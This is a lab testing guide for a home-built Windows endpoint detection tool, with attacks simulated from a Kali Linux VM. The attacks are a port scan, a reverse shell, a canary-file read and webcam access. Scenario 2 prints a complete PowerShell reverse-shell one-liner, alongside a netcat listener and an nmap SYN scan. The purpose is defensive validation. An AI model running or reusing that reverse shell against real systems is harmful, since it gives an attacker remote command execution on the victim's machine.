# Endpoint Guard: Kali Linux VM Testing & Validation Guide

This guide provides step-by-step instructions for testing **Endpoint Guard** on your Windows laptop using your **Kali Linux VM** (connected via Host-Only, Bridged, or NAT virtual network adapter).

---

## Pre-Test Setup

### 1. Verify Network Connectivity
- **Windows Laptop IP**: Open PowerShell on your laptop and check your IP:
  ```powershell
  ipconfig
  ```
  *(Example: `192.168.56.1` or `192.168.1.100`)*
- **Kali Linux IP**: In Kali terminal, check your VM IP:
  ```bash
  ip a
  ```
  *(Example: `192.168.56.101`)*

### 2. Start Endpoint Guard on Windows
Open PowerShell as **Administrator** in `d:\Mini\endpoint_guard`:
```powershell
python endpoint_guard\main.py
```
- Open the web console in your browser: `http://127.0.0.1:8443`
- The system tray icon will appear in the Windows taskbar.

---

## Test Scenario 1: Nmap Port Scan & Service Discovery

### Objective
Verify that Endpoint Guard detects incoming port scanning activity from the Kali VM and logs an attacker profile.

### Execution from Kali VM
Run a standard SYN scan against the Windows laptop:
```bash
nmap -sS -p 20-100 --max-rate 50 <LAPTOP_IP>
```

### Expected Result on Windows Laptop
1. **Rule Triggered**: `NET-003` (`Network Port Scan Detected`).
2. **Severity**: `Medium`.
3. **Automated Response**:
   - Attacker profile created in SQLite (`attackers` table) with Kali's IP, MAC address, and probed ports.
   - Event recorded in the cryptographic event ledger.
   - Incident displayed on Dashboard at `http://127.0.0.1:8443`.

---

## Test Scenario 2: Interactive Reverse Shell (Netcat / Meterpreter)

### Objective
Verify that when an attacker obtains or attempts a reverse shell connected back to Kali, Endpoint Guard detects it in $\le 1$ second, kills the process tree on the Windows host, and blocks the Kali IP in Windows Firewall.

### Step 1: Start Listener on Kali VM
In Kali terminal:
```bash
nc -lvnp 4444
```

### Step 2: Trigger Simulated Reverse Connection on Laptop
In a secondary PowerShell window on the Windows laptop, simulate an outbound reverse shell connection to Kali:
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('192.168.56.101', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
*(Replace `192.168.56.101` with your Kali VM IP)*

### Expected Result on Windows Laptop
1. **Rule Triggered**: `NET-001` (`Interactive Shell Reverse Connection Detected`).
2. **Severity**: `Critical`.
3. **Automated Containment Action**:
   - Offending `powershell.exe` process and its process tree are forcefully terminated via `taskkill /F /T /PID`.
   - Windows Firewall rule added: `New-NetFirewallRule -DisplayName "EndpointGuard_Block_<KALI_IP>"` blocking inbound and outbound traffic to Kali.
   - Kali's netcat listener session drops immediately.
   - Desktop toast notification pops up: `Endpoint Guard: Attack Contained (Critical)`.
   - Incident updated to `Contained`.

---

## Test Scenario 3: Unauthorized File Theft & Honeypot Canary Tripwire

### Objective
Verify that attempts by an attacker to harvest user files or access decoy honeypot files (`passwords.xlsx`, `corporate_secrets.docx`) immediately trigger high-severity containment.

### Step 1: Canary File Verification
Confirm that canary files are deployed on the laptop:
- `C:\Users\<User>\Documents\passwords.xlsx`
- `C:\Users\<User>\Desktop\corporate_secrets.docx`

### Step 2: Simulated File Access / Exfiltration Command
Simulate an attacker script or rogue tool attempting to read or copy the decoy file:
```powershell
Get-Content "$env:USERPROFILE\Documents\passwords.xlsx"
```
Or create a rapid batch read of sensitive documents:
```powershell
1..25 | ForEach-Object { Set-Content "$env:USERPROFILE\Documents\secret_$_.docx" "Confidential data" }
```

### Expected Result on Windows Laptop
1. **Rule Triggered**: `FILE-001` (`Honeypot Canary File Tripwire Triggered`) or `FILE-002` (`Bulk Sensitive File Harvesting Pattern`).
2. **Severity**: `Critical` / `High`.
3. **Automated Containment Action**:
   - The accessing process is terminated.
   - Dropped/accessed files are moved into the locked quarantine vault at `C:\ProgramData\EndpointGuard\quarantine\`.
   - Incident evidence recorded in SQLite.

---

## Test Scenario 4: Unauthorized Webcam / Microphone Surveillance

### Objective
Verify that unauthorized scripts or utilities attempting to open the laptop's camera or microphone are intercepted and flagged.

### Step 1: Run Simulated Camera Access Script
Run a test script that requests webcam access (or attempts to capture camera frames):
```powershell
python -c "import cv2; cap = cv2.VideoCapture(0); cap.read(); cap.release()"
```
*(Or inspect with any third-party recording tool not in the approved apps list).*

### Expected Result on Windows Laptop
1. **Rule Triggered**: `PERIPH-001` (`Unauthorized Webcam Access Attempt`).
2. **Severity**: `Critical`.
3. **Automated Response**:
   - Windows ConsentStore detects `python.exe` accessing `webcam`.
   - Endpoint Guard terminates the unauthorized process PID.
   - System alert notification displayed to the user.

---

## Verification & Forensic Audit Checklist

| Check | Verification Command / Step | Expected Result | Pass/Fail |
|---|---|---|---|
| **1. Attacker Profile** | Check `http://127.0.0.1:8443/attackers` | Kali IP listed with MAC address and risk score $\ge 90$ | [ ] |
| **2. Firewall Block** | Run `Get-NetFirewallRule -DisplayName "EndpointGuard_Block_*"` | Block rule exists for Kali IP | [ ] |
| **3. Process Kill** | Check Task Manager / Process list | Malicious process is terminated | [ ] |
| **4. Quarantine Vault** | Check `C:\ProgramData\EndpointGuard\quarantine\` | Hostile payload moved with `.quarantine` extension | [ ] |
| **5. Tamper Verification** | Run `python scripts\verify_hash_chain.py` | `Status: PASS (Hash chain is fully verified)` | [ ] |
| **6. Incident Report** | Click "View Report" on Dashboard | Standalone HTML report with timeline & IOCs | [ ] |

---

## Unblocking Kali VM After Testing

To reset the firewall and allow legitimate network communication again:
1. In the Web Console (`http://127.0.0.1:8443/attackers`), click the **Unblock** button next to the Kali IP.
2. Or run PowerShell as Administrator:
   ```powershell
   Get-NetFirewallRule -DisplayName "EndpointGuard_Block_*" | Remove-NetFirewallRule
   ```
